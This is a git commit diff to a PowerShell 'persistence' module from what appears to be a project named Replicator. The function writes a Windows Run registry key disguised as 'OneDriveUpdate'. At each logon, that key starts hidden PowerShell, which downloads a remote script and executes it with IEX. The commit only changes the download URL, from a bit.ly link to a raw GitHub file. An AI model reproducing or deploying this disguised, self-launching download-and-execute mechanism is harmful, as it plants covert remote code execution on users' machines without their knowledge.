a9dd3733762c2702a0d48323418cc4652ef7a087
josprou <34846208+josprou@users.noreply.github.com>
2023-05-19 03:15:42 +0200

    Update persistence.ps1

--- modules/persistence.ps1
+++ modules/persistence.ps1
@@ -1,3 +1,3 @@
 function persistence{
-  reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "OneDriveUpdate" /d "powershell.exe -NoP -W Hidden IEX (New-Object System.Net.Webclient).DownloadString('https://bit.ly/3uQ5Wid')" /t REG_SZ /f 
+  reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "OneDriveUpdate" /d "powershell.exe -NoP -W Hidden IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/josprou/Replicator/main/Replicator.ps1')" /t REG_SZ /f 
 }
